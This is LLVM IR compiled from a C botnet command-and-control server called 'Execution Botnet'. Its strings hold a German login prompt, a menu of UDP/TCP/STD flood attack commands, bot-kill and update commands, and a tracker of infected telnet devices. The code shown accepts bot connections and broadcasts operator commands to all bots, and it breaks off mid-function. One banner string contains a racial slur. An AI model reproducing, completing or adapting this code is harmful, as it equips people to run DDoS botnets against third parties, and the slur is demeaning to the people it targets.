; ModuleID = 'Ex9server.c'
source_filename = "Ex9server.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.clientdata_t = type { i32, i8 }
%struct.telnetdata_t = type { i32 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, %struct._IO_codecvt*, %struct._IO_wide_data*, %struct._IO_FILE*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type opaque
%struct._IO_codecvt = type opaque
%struct._IO_wide_data = type opaque
%struct.login_info = type { [100 x i8], [100 x i8] }
%struct.tm = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i64, i8* }
%struct.epoll_event = type <{ i32, %union.epoll_data }>
%union.epoll_data = type { i8* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%union.pthread_attr_t = type { i64, [48 x i8] }
%struct.addrinfo = type { i32, i32, i32, i32, i32, %struct.sockaddr*, i8*, %struct.addrinfo* }

@.str = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@clients = dso_local global [1000000 x %struct.clientdata_t] zeroinitializer, align 16
@managements = dso_local global [1000000 x %struct.telnetdata_t] zeroinitializer, align 16
@.str.1 = private unnamed_addr constant [8 x i8] c"\1B[1;35m\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c": \00", align 1
@.str.3 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@epollFD = internal global i32 0, align 4
@listenFD = internal global i32 0, align 4
@.str.4 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.5 = private unnamed_addr constant [12 x i8] c"!* BOTKILL\0A\00", align 1
@.str.6 = private unnamed_addr constant [10 x i8] c"epoll_ctl\00", align 1
@.str.7 = private unnamed_addr constant [6 x i8] c"PONG\0A\00", align 1
@.str.8 = private unnamed_addr constant [8 x i8] c"REPORT \00", align 1
@telFD = internal global %struct._IO_FILE* null, align 8
@.str.9 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@TELFound = internal global i32 0, align 4
@.str.10 = private unnamed_addr constant [8 x i8] c"PROBING\00", align 1
@scannerreport = internal global i32 0, align 4
@.str.11 = private unnamed_addr constant [15 x i8] c"REMOVING PROBE\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.13 = private unnamed_addr constant [11 x i8] c"buf: \22%s\22\0A\00", align 1
@.str.14 = private unnamed_addr constant [10 x i8] c"login.txt\00", align 1
@.str.15 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.16 = private unnamed_addr constant [63 x i8] c"%c]0; Devices Infected [ %d ] | [ %s ] - Users Online [ %d ]%c\00", align 1
@accounts = internal global [100 x %struct.login_info] zeroinitializer, align 16
@OperatorsConnected = internal global i32 0, align 4
@.str.17 = private unnamed_addr constant [6 x i8] c"%s %s\00", align 1
@.str.18 = private unnamed_addr constant [5 x i8] c"\1B[1A\00", align 1
@.str.19 = private unnamed_addr constant [23 x i8] c"\1B[0;91mBenutzer\1B[97m: \00", align 1
@.str.20 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.21 = private unnamed_addr constant [23 x i8] c"\1B[0;91mPasswort\1B[97m: \00", align 1
@.str.22 = private unnamed_addr constant [93 x i8] c"\1B[0;91mBitte warten Sie ... Ich \C3\BCberpr\C3\BCfe Ihre Anmeldeinformationen \1B[97m[\1B[0;91m|\1B[97m]\0D\0A\00", align 1
@.str.23 = private unnamed_addr constant [93 x i8] c"\1B[0;91mBitte warten Sie ... Ich \C3\BCberpr\C3\BCfe Ihre Anmeldeinformationen \1B[97m[\1B[0;91m/\1B[97m]\0D\0A\00", align 1
@.str.24 = private unnamed_addr constant [93 x i8] c"\1B[0;91mBitte warten Sie ... Ich \C3\BCberpr\C3\BCfe Ihre Anmeldeinformationen \1B[97m[\1B[0;91m-\1B[97m]\0D\0A\00", align 1
@.str.25 = private unnamed_addr constant [30 x i8] c"\1B[0;91mWillkommen im Botnet\0D\0A\00", align 1
@.str.26 = private unnamed_addr constant [88 x i8] c"\1B[0;91m d88888b db    db d88888b  .o88b. db    db d888888b d888888b  .d88b.  d8b   db\0D\0A\00", align 1
@.str.27 = private unnamed_addr constant [88 x i8] c"\1B[0;91m 88'     `8b  d8' 88'     d8P  Y8 88    88 `~~88~~'   `88'   .8P  Y8. 888o  88\0D\0A\00", align 1
@.str.28 = private unnamed_addr constant [88 x i8] c"\1B[0;91m 88ooooo  `8bd8'  88ooooo 8P      88    88    88       88    88    88 88V8o 88\0D\0A\00", align 1
@.str.29 = private unnamed_addr constant [88 x i8] c"\1B[0;91m 88~~~~~  .dPYb.  88~~~~~ 8b      88    88    88       88    88    88 88 V8o88\0D\0A\00", align 1
@.str.30 = private unnamed_addr constant [88 x i8] c"\1B[0;91m 88.     .8P  Y8. 88.     Y8b  d8 88b  d88    88      .88.   `8b  d8' 88  V888\0D\0A\00", align 1
@.str.31 = private unnamed_addr constant [88 x i8] c"\1B[0;91m Y88888P YP    YP Y88888P  `Y88P' ~Y8888P'    YP    Y888888P  `Y88P'  VP   V8P\0D\0A\00", align 1
@.str.32 = private unnamed_addr constant [26 x i8] c"\1B[90m\09\09\09\09\09\09\09\09\09\09\09\09\09\09    \0D\0A\00", align 1
@.str.33 = private unnamed_addr constant [24 x i8] c"\1B[0;91mExecution\1B[97m# \00", align 1
@.str.34 = private unnamed_addr constant [5 x i8] c"BOTS\00", align 1
@.str.35 = private unnamed_addr constant [33 x i8] c"\1B[0;91mBots Connected: \1B[97m%d\0D\0A\00", align 1
@.str.36 = private unnamed_addr constant [27 x i8] c"\1B[0;91mTel Bots: \1B[97m%d\0D\0A\00", align 1
@.str.37 = private unnamed_addr constant [31 x i8] c"\1B[0;91mUsers Online: \1B[97m%d\0D\0A\00", align 1
@.str.38 = private unnamed_addr constant [5 x i8] c"HELP\00", align 1
@.str.39 = private unnamed_addr constant [44 x i8] c"\1B[97m>---\1B[0;91mList Of Commands\1B[97m---<\0D\0A\00", align 1
@.str.40 = private unnamed_addr constant [27 x i8] c"\1B[97m!* STD IP PORT TIME\0D\0A\00", align 1
@.str.41 = private unnamed_addr constant [39 x i8] c"\1B[97m!* UDP IP PORT TIME 32 1337 400\0D\0A\00", align 1
@.str.42 = private unnamed_addr constant [43 x i8] c"\1B[97m!* TCP IP PORT TIME 32 all 1337 400\0D\0A\00", align 1
@.str.43 = private unnamed_addr constant [47 x i8] c"\1B[97m>---\1B[0;91mServerside Commands\1B[97m---<\0D\0A\00", align 1
@.str.44 = private unnamed_addr constant [16 x i8] c"\1B[97m!* CLEAN\0D\0A\00", align 1
@.str.45 = private unnamed_addr constant [17 x i8] c"\1B[97m!* UPDATE\0D\0A\00", align 1
@.str.46 = private unnamed_addr constant [19 x i8] c"\1B[97m!* KILLATTK\0D\0A\00", align 1
@.str.47 = private unnamed_addr constant [13 x i8] c"\1B[97mCLEAR\0D\0A\00", align 1
@.str.48 = private unnamed_addr constant [14 x i8] c"\1B[97mLOGOUT\0D\0A\00", align 1
@.str.49 = private unnamed_addr constant [11 x i8] c"!* BOTKILL\00", align 1
@.str.50 = private unnamed_addr constant [13 x i8] c"!* BOTKILL\0D\0A\00", align 1
@.str.51 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.52 = private unnamed_addr constant [52 x i8] c"\1B[97m[\1B[0;91mExecution\1B[97m] \1B[31mATTACKS STOPPED\0D\0A\00", align 1
@.str.53 = private unnamed_addr constant [8 x i8] c"output.\00", align 1
@.str.54 = private unnamed_addr constant [6 x i8] c"CLEAR\00", align 1
@.str.55 = private unnamed_addr constant [11 x i8] c"\1B[2J\1B[1;1H\00", align 1
@.str.56 = private unnamed_addr constant [4 x i8] c"cls\00", align 1
@.str.57 = private unnamed_addr constant [6 x i8] c"clear\00", align 1
@.str.58 = private unnamed_addr constant [7 x i8] c"LOGOUT\00", align 1
@.str.59 = private unnamed_addr constant [22 x i8] c"\1B[90m        _    _\0D\0A\00", align 1
@.str.60 = private unnamed_addr constant [89 x i8] c"     \1B[97m__\1B[38;5;202m|\1B[97m_\1B[38;5;202m|\1B[97m__\1B[38;5;202m|\1B[97m_\1B[38;5;202m|\1B[97m__\0D\0A\00", align 1
@.str.61 = private unnamed_addr constant [53 x i8] c"\1B[97m   \1B[31m_\1B[97m|\1B[31m____________\1B[97m|\1B[31m__\0D\0A\00", align 1
@.str.62 = private unnamed_addr constant [30 x i8] c"\1B[31m  |o o o o o o o o /  \0D\0A\00", align 1
@.str.63 = private unnamed_addr constant [32 x i8] c"\1B[96m~~~~~~~~~~~~~~~~~~~~~~~~\0D\0A\00", align 1
@.str.64 = private unnamed_addr constant [32 x i8] c"\1B[34mBIG BOATS MY NIGGA, YEET\0D\0A\00", align 1
@.str.65 = private unnamed_addr constant [10 x i8] c"%s: \22%s\22\0A\00", align 1
@.str.66 = private unnamed_addr constant [12 x i8] c"history.log\00", align 1
@.str.67 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.68 = private unnamed_addr constant [9 x i8] c"%I:%M %p\00", align 1
@.str.69 = private unnamed_addr constant [13 x i8] c"[%s] %s: %s\0A\00", align 1
@.str.70 = private unnamed_addr constant [21 x i8] c"ERROR opening socket\00", align 1
@.str.71 = private unnamed_addr constant [17 x i8] c"ERROR on binding\00", align 1
@.str.72 = private unnamed_addr constant [16 x i8] c"ERROR on accept\00", align 1
@stderr = external global %struct._IO_FILE*, align 8
@.str.73 = private unnamed_addr constant [43 x i8] c"Usage: %s [Bot-Port] [Threads] [Cnc-Port]\0A\00", align 1
@.str.74 = private unnamed_addr constant [27 x i8] c"Execution Botnet Screened\0A\00", align 1
@.str.75 = private unnamed_addr constant [32 x i8] c"\1B[0;91mCreated by Kaden\1B[1;37m\0A\00", align 1
@.str.76 = private unnamed_addr constant [11 x i8] c"telnet.txt\00", align 1
@.str.77 = private unnamed_addr constant [3 x i8] c"a+\00", align 1
@.str.78 = private unnamed_addr constant [7 x i8] c"listen\00", align 1
@.str.79 = private unnamed_addr constant [13 x i8] c"epoll_create\00", align 1
@.str.80 = private unnamed_addr constant [5 x i8] c"ZERO\00", align 1
@.str.81 = private unnamed_addr constant [6 x i8] c"fcntl\00", align 1
@.str.82 = private unnamed_addr constant [17 x i8] c"getaddrinfo: %s\0A\00", align 1
@.str.83 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.84 = private unnamed_addr constant [16 x i8] c"Could not bind\0A\00", align 1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @fdgets(i8* %0, i32 %1, i32 %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 1, i32* %8, align 4
  br label %9

9:                                                ; preds = %27, %3
  %10 = load i32, i32* %8, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

12:                                               ; preds = %9
  %13 = load i32, i32* %7, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

16:                                               ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %7, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

25:                                               ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %37

27:                                               ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %7, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %8, align 4
  %35 = load i32, i32* %7, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %7, align 4
  br label %9, !llvm.loop !6

37:                                               ; preds = %25
  %38 = load i32, i32* %8, align 4
  ret i32 %38
}

declare i64 @read(i32, i8*, i64) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @trim(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #8
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

10:                                               ; preds = %19, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #8
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %22

19:                                               ; preds = %10
  %20 = load i32, i32* %4, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %4, align 4
  br label %10, !llvm.loop !8

22:                                               ; preds = %10
  br label %23

23:                                               ; preds = %38, %22
  %24 = load i32, i32* %5, align 4
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %24, %25
  br i1 %26, label %27, label %36

27:                                               ; preds = %23
  %28 = load i8*, i8** %2, align 8
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = call i32 @isspace(i32 %33) #8
  %35 = icmp ne i32 %34, 0
  br label %36

36:                                               ; preds = %27, %23
  %37 = phi i1 [ false, %23 ], [ %35, %27 ]
  br i1 %37, label %38, label %41

38:                                               ; preds = %36
  %39 = load i32, i32* %5, align 4
  %40 = add nsw i32 %39, -1
  store i32 %40, i32* %5, align 4
  br label %23, !llvm.loop !9

41:                                               ; preds = %36
  %42 = load i32, i32* %4, align 4
  store i32 %42, i32* %3, align 4
  br label %43

43:                                               ; preds = %59, %41
  %44 = load i32, i32* %3, align 4
  %45 = load i32, i32* %5, align 4
  %46 = icmp sle i32 %44, %45
  br i1 %46, label %47, label %62

47:                                               ; preds = %43
  %48 = load i8*, i8** %2, align 8
  %49 = load i32, i32* %3, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = load i8*, i8** %2, align 8
  %54 = load i32, i32* %3, align 4
  %55 = load i32, i32* %4, align 4
  %56 = sub nsw i32 %54, %55
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %53, i64 %57
  store i8 %52, i8* %58, align 1
  br label %59

59:                                               ; preds = %47
  %60 = load i32, i32* %3, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %3, align 4
  br label %43, !llvm.loop !10

62:                                               ; preds = %43
  %63 = load i8*, i8** %2, align 8
  %64 = load i32, i32* %3, align 4
  %65 = load i32, i32* %4, align 4
  %66 = sub nsw i32 %64, %65
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %63, i64 %67
  store i8 0, i8* %68, align 1
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i64 @strlen(i8*) #2

; Function Attrs: nounwind readonly willreturn
declare i32 @isspace(i32) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @broadcast(i8* %0, i32 %1, i8* %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca %struct.tm*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i8* %2, i8** %6, align 8
  store i32 1, i32* %7, align 4
  %13 = load i8*, i8** %4, align 8
  %14 = call i32 @strcmp(i8* %13, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0)) #8
  %15 = icmp eq i32 %14, 0
  br i1 %15, label %16, label %17

16:                                               ; preds = %3
  store i32 0, i32* %7, align 4
  br label %17

17:                                               ; preds = %16, %3
  %18 = load i8*, i8** %4, align 8
  %19 = call i64 @strlen(i8* %18) #8
  %20 = add i64 %19, 10
  %21 = call noalias align 16 i8* @malloc(i64 %20) #9
  store i8* %21, i8** %8, align 8
  %22 = load i8*, i8** %8, align 8
  %23 = load i8*, i8** %4, align 8
  %24 = call i64 @strlen(i8* %23) #8
  %25 = add i64 %24, 10
  call void @llvm.memset.p0i8.i64(i8* align 1 %22, i8 0, i64 %25, i1 false)
  %26 = load i8*, i8** %8, align 8
  %27 = load i8*, i8** %4, align 8
  %28 = call i8* @strcpy(i8* %26, i8* %27) #9
  %29 = load i8*, i8** %8, align 8
  call void @trim(i8* %29)
  %30 = call i64 @time(i64* %9) #9
  %31 = call %struct.tm* @localtime(i64* %9) #9
  store %struct.tm* %31, %struct.tm** %10, align 8
  %32 = load %struct.tm*, %struct.tm** %10, align 8
  %33 = call i8* @asctime(%struct.tm* %32) #9
  store i8* %33, i8** %11, align 8
  %34 = load i8*, i8** %11, align 8
  call void @trim(i8* %34)
  store i32 0, i32* %12, align 4
  br label %35

35:                                               ; preds = %78, %17
  %36 = load i32, i32* %12, align 4
  %37 = icmp slt i32 %36, 1000000
  br i1 %37, label %38, label %81

38:                                               ; preds = %35
  %39 = load i32, i32* %12, align 4
  %40 = load i32, i32* %5, align 4
  %41 = icmp eq i32 %39, %40
  br i1 %41, label %49, label %42

42:                                               ; preds = %38
  %43 = load i32, i32* %12, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %44
  %46 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %45, i32 0, i32 1
  %47 = load i8, i8* %46, align 4
  %48 = icmp ne i8 %47, 0
  br i1 %48, label %50, label %49

49:                                               ; preds = %42, %38
  br label %78

50:                                               ; preds = %42
  %51 = load i32, i32* %7, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %70

53:                                               ; preds = %50
  %54 = load i32, i32* %12, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %55
  %57 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %56, i32 0, i32 0
  %58 = load i32, i32* %57, align 4
  %59 = icmp ne i32 %58, 0
  br i1 %59, label %60, label %70

60:                                               ; preds = %53
  %61 = load i32, i32* %12, align 4
  %62 = call i64 @send(i32 %61, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0), i64 9, i32 16384)
  %63 = load i32, i32* %12, align 4
  %64 = load i8*, i8** %6, align 8
  %65 = load i8*, i8** %6, align 8
  %66 = call i64 @strlen(i8* %65) #8
  %67 = call i64 @send(i32 %63, i8* %64, i64 %66, i32 16384)
  %68 = load i32, i32* %12, align 4
  %69 = call i64 @send(i32 %68, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0), i64 2, i32 16384)
  br label %70

70:                                               ; preds = %60, %53, %50
  %71 = load i32, i32* %12, align 4
  %72 = load i8*, i8** %4, align 8
  %73 = load i8*, i8** %4, align 8
  %74 = call i64 @strlen(i8* %73) #8
  %75 = call i64 @send(i32 %71, i8* %72, i64 %74, i32 16384)
  %76 = load i32, i32* %12, align 4
  %77 = call i64 @send(i32 %76, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3, i64 0, i64 0), i64 1, i32 16384)
  br label %78

78:                                               ; preds = %70, %49
  %79 = load i32, i32* %12, align 4
  %80 = add nsw i32 %79, 1
  store i32 %80, i32* %12, align 4
  br label %35, !llvm.loop !11

81:                                               ; preds = %35
  %82 = load i8*, i8** %8, align 8
  call void @free(i8* %82) #9
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i32 @strcmp(i8*, i8*) #2

; Function Attrs: nounwind
declare noalias align 16 i8* @malloc(i64) #3

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #4

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #3

; Function Attrs: nounwind
declare %struct.tm* @localtime(i64*) #3

; Function Attrs: nounwind
declare i8* @asctime(%struct.tm*) #3

declare i64 @send(i32, i8*, i64, i32) #1

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @BotEventLoop(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca %struct.epoll_event, align 1
  %4 = alloca %struct.epoll_event*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr, align 2
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.clientdata_t*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i64, align 8
  %17 = alloca [2048 x i8], align 16
  %18 = alloca i8*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %21 = call noalias align 16 i8* @calloc(i64 1000000, i64 12) #9
  %22 = bitcast i8* %21 to %struct.epoll_event*
  store %struct.epoll_event* %22, %struct.epoll_event** %4, align 8
  br label %23

23:                                               ; preds = %1, %295
  %24 = load volatile i32, i32* @epollFD, align 4
  %25 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %26 = call i32 @epoll_wait(i32 %24, %struct.epoll_event* %25, i32 1000000, i32 -1)
  store i32 %26, i32* %6, align 4
  store i32 0, i32* %7, align 4
  br label %27

27:                                               ; preds = %292, %23
  %28 = load i32, i32* %7, align 4
  %29 = load i32, i32* %6, align 4
  %30 = icmp slt i32 %28, %29
  br i1 %30, label %31, label %295

31:                                               ; preds = %27
  %32 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %33 = load i32, i32* %7, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %32, i64 %34
  %36 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %35, i32 0, i32 0
  %37 = load i32, i32* %36, align 1
  %38 = and i32 %37, 8
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %58, label %40

40:                                               ; preds = %31
  %41 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %41, i64 %43
  %45 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %44, i32 0, i32 0
  %46 = load i32, i32* %45, align 1
  %47 = and i32 %46, 16
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %58, label %49

49:                                               ; preds = %40
  %50 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %51 = load i32, i32* %7, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %50, i64 %52
  %54 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %53, i32 0, i32 0
  %55 = load i32, i32* %54, align 1
  %56 = and i32 %55, 1
  %57 = icmp ne i32 %56, 0
  br i1 %57, label %77, label %58

58:                                               ; preds = %49, %40, %31
  %59 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %60 = load i32, i32* %7, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %59, i64 %61
  %63 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %62, i32 0, i32 1
  %64 = bitcast %union.epoll_data* %63 to i32*
  %65 = load i32, i32* %64, align 1
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %66
  %68 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %67, i32 0, i32 1
  store i8 0, i8* %68, align 4
  %69 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %70 = load i32, i32* %7, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %69, i64 %71
  %73 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %72, i32 0, i32 1
  %74 = bitcast %union.epoll_data* %73 to i32*
  %75 = load i32, i32* %74, align 1
  %76 = call i32 @close(i32 %75)
  br label %292

77:                                               ; preds = %49
  %78 = load volatile i32, i32* @listenFD, align 4
  %79 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %80 = load i32, i32* %7, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %79, i64 %81
  %83 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %82, i32 0, i32 1
  %84 = bitcast %union.epoll_data* %83 to i32*
  %85 = load i32, i32* %84, align 1
  %86 = icmp eq i32 %78, %85
  br i1 %86, label %87, label %184

87:                                               ; preds = %77
  br label %88

88:                                               ; preds = %87, %151, %154, %178
  store i32 16, i32* %9, align 4
  %89 = load volatile i32, i32* @listenFD, align 4
  %90 = call i32 @accept(i32 %89, %struct.sockaddr* %8, i32* %9)
  store i32 %90, i32* %10, align 4
  %91 = load i32, i32* %10, align 4
  %92 = icmp eq i32 %91, -1
  br i1 %92, label %93, label %103

93:                                               ; preds = %88
  %94 = call i32* @__errno_location() #10
  %95 = load i32, i32* %94, align 4
  %96 = icmp eq i32 %95, 11
  br i1 %96, label %101, label %97

97:                                               ; preds = %93
  %98 = call i32* @__errno_location() #10
  %99 = load i32, i32* %98, align 4
  %100 = icmp eq i32 %99, 11
  br i1 %100, label %101, label %102

101:                                              ; preds = %97, %93
  br label %183

102:                                              ; preds = %97
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0))
  br label %183

103:                                              ; preds = %88
  %104 = bitcast %struct.sockaddr* %8 to %struct.sockaddr_in*
  %105 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %104, i32 0, i32 2
  %106 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %105, i32 0, i32 0
  %107 = load i32, i32* %106, align 2
  %108 = load i32, i32* %10, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %109
  %111 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %110, i32 0, i32 0
  store i32 %107, i32* %111, align 8
  store i32 0, i32* %12, align 4
  store i32 0, i32* %11, align 4
  br label %112

112:                                              ; preds = %141, %103
  %113 = load i32, i32* %11, align 4
  %114 = icmp slt i32 %113, 1000000
  br i1 %114, label %115, label %144

115:                                              ; preds = %112
  %116 = load i32, i32* %11, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %117
  %119 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %118, i32 0, i32 1
  %120 = load i8, i8* %119, align 4
  %121 = icmp ne i8 %120, 0
  br i1 %121, label %122, label %126

122:                                              ; preds = %115
  %123 = load i32, i32* %11, align 4
  %124 = load i32, i32* %10, align 4
  %125 = icmp eq i32 %123, %124
  br i1 %125, label %126, label %127

126:                                              ; preds = %122, %115
  br label %141

127:                                              ; preds = %122
  %128 = load i32, i32* %11, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %129
  %131 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %130, i32 0, i32 0
  %132 = load i32, i32* %131, align 8
  %133 = load i32, i32* %10, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %134
  %136 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %135, i32 0, i32 0
  %137 = load i32, i32* %136, align 8
  %138 = icmp eq i32 %132, %137
  br i1 %138, label %139, label %140

139:                                              ; preds = %127
  store i32 1, i32* %12, align 4
  br label %144

140:                                              ; preds = %127
  br label %141

141:                                              ; preds = %140, %126
  %142 = load i32, i32* %11, align 4
  %143 = add nsw i32 %142, 1
  store i32 %143, i32* %11, align 4
  br label %112, !llvm.loop !12

144:                                              ; preds = %139, %112
  %145 = load i32, i32* %12, align 4
  %146 = icmp ne i32 %145, 0
  br i1 %146, label %147, label %157

147:                                              ; preds = %144
